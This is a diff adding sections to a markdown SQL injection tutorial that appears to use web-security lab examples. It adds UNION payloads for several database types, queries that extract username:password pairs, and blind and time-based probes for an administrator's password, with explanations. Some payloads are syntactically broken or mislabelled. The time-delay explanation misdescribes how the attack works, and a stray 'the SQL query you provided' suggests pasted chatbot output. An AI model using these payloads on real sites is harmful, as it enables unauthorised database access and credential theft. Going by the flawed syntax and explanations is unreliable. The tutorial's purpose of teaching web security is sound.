@@ -230,17 +230,28 @@ The queries to determine the database version for some popular database types ar
 
 | Database Type | Query |
 | --- | --- |
-| Microsoft, MySQL | SELECT @@VERSION |
+| Microsoft, MySQL | SELECT @@version |
 | Oracle | SELECT * FROM v$version|
 | PostgreSQL | SELECT version() |
 
 By adding that to UNION Statement our query looks like this.
 
 ```
-https://insecure-website.com/products?category=Gifts'+UNION+SELECT+NULL,NULL,@@VERSION--+-
+https://insecure-website.com/products?category=Gifts'+UNION+SELECT+NULL,NULL,@@version--+-
 ```
 
 This will show us the DBMS name so now knowing this information we have to change our query syntax with that DBMS syntax.
+
+For UNION Statements its like this
+
+| Database | Query |
+| --- | --- |
+| MySQL | 'UNION SELECT 1,@@version,3-- - |
+| Microsoft SQL | 'UNION SELECT 1,@@version,3-- - |
+| PostgreSQL | 'UNION SELECT 1,version(),3-- - |
+| Oracle | 'UNION SELECT 1,banner,3 FROM v$version-- - |
+
+Where 1, 3 and banner are colums that are not showing in HTML contex and we must use that as UNION statement shows error if no of columns of first statement does not match with no of columns of other statement.
 
 **Querying the DBMS Databases, Tables, and Columns Names**
 
@@ -282,6 +293,22 @@ carlos:montoya
 | Microsoft | 'foo'+'bar' |
 | PostgreSQL | 'foo'||'bar' |
 | MySQL | 'foo'` `'bar' `[Note the space between the two string]` CONCAT('foo','bar') |
+
+They will like this in SQLi format
+
+| DBMS | String Concatenation Query |
+| --- | --- |
+| MySQL | 'UNION SELECT 1, concat(username,':',password), 3 FROM users-- - |
+| MSSQL | 'UNION SELECT 1, username + ':' + password, 3 FROM users-- - |
+ PostgreSQL
+ ```SQL
+'UNION SELECT 1, username || ':' || password, 3 FROM users-- -
+```
+
+Oracle
+```SQL
+'UNION SELECT 1, username || ':' || password, 3 FROM users-- -
+```
 
 **Blind SQLi**
 
@@ -354,6 +381,32 @@ Every DBMS has its syntax for conditional errors so you must know which DBMS you
 'SELECT * FROM market where product = red bull' AND (SUBSTRING( SELECT password FROM Users where Username = 'Administrator'), 1,1) = 's'
 ```
 
+The payload consists of two parts:
+
+1. The original query `'SELECT * FROM market where product = red bull'` which retrieves data from the `market` table based on the product name.
+2. The malicious query `AND (SUBSTRING( SELECT password FROM Users where Username = 'Administrator'), 1,1) = 's'` which retrieves the first character of the password for the `Administrator` user from the `Users` table and compares it with the letter 's'.
+
+The `AND` operator connects the original query and the malicious query, effectively executing both as a single query. If the first character of the password is 's', then the entire query will return a positive result and the application will display data. If the first character of the password is not 's', the query will return a negative result, and the application will not display any data.
+
+This payload uses the `SUBSTRING` function to extract the first character of the password, and the `=` operator to compare it with the letter 's'. The `( SELECT password FROM Users where Username = 'Administrator')` part of the query retrieves the password for the `Administrator` user from the `Users` table.
+
+To check the second character of the password, the payload would be similar, but with a slight modification to the comparison part of the query. For example:
+
+```sql
+'SELECT * FROM market where product = red bull' AND (SUBSTRING( SELECT password FROM Users where Username = 'Administrator'), 2,1) = 'e'
+```
+
+In this payload, the comparison part of the query has been changed to `(SUBSTRING( SELECT password FROM Users where Username = 'Administrator'), 2,1) = 'e'`, which extracts the second character of the password and compares it with the letter 'e'. If the second character of the password is 'e', the query will return a positive result and the application will display data. If the second character is not 'e', the query will return a negative result and the application will not display any data.
+
+Here is an example of a similar query in different database management systems:
+
+| DBMS |  |
+| --- | --- |
+| MySQL | 'SELECT * FROM market where product = 'red bull' AND (SUBSTRING((SELECT password FROM Users where username = 'Administrator'), 2, 1)) = 'e'
+| MS SQL | 'SELECT * FROM market where product = 'red bull' AND (SUBSTRING((SELECT password FROM Users where username = 'Administrator'), 2, 1)) = 'e' |
+| Oracle | 'SELECT * FROM market where product = 'red bull' AND (SUBSTR( (SELECT password FROM Users where username = 'Administrator'), 2, 1)) = 'e' |
+| PostgreSQL | 'SELECT * FROM market where product = 'red bull' AND (SUBSTRING((SELECT password FROM Users where username = 'Administrator'), 2, 1)) = 'e' |
+
 **Blind SQLi by triggering SQL Errors**
 
 From above application show a `Welcome Back!` message if the query works fine otherwise they didn't show that and because of that, we breach data. But sometimes the application doesn't show that behavior in SQL injection so, in that case, we can trigger sql error with some condition if the condition is met our query gets an error that shows the valid character if not then that character is not valid.
@@ -398,6 +451,16 @@ Using this technique, we can retrieve data in the way already described, by syst
 ```mysql
 '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
 ```
+
+The above payload is another example of a conditional SQL injection payload. It is used to test for the presence of SQL injection vulnerabilities in a web application by observing the behavior of the application in response to different conditions.
+
+The payload uses the `IF` statement to check the count of the number of usernames that match the condition in the `WHERE` clause. The condition checks for the presence of a user named `Administrator` and checks if the first character of the password for that user is greater than `'m'`. If the condition is true, the query will wait for a specified delay before returning a result.
+
+The `WAITFOR DELAY` statement is used to introduce a delay in the execution of the query. This can be used to determine if the application is vulnerable to time-based SQL injection attacks. An attacker could use this type of payload to determine the password for a user by incrementally increasing the delay and observing the behavior of the application.
+
+The `COUNT(Username)` function in SQL is used to count the number of rows in a table that meet a certain condition. In the case of the SQL query you provided, `COUNT(Username)` is used to count the number of rows in the `Users` table where the `Username` column is equal to `'Administrator'` and the first character of the `Password` column is greater than `'m'`.
+
+So, the overall purpose of the query is to check if there is exactly one row in the `Users` table where the `Username` is `'Administrator'` and the first character of the `Password` is greater than `'m'`. If that condition is true, then the `WAITFOR DELAY` statement is executed, which will cause a delay in the response from the database.
 
 > **Note:** There are various ways of triggering time delays within SQL queries, and different techniques apply to different types of databases. So you should know which type of database you are attacking
 
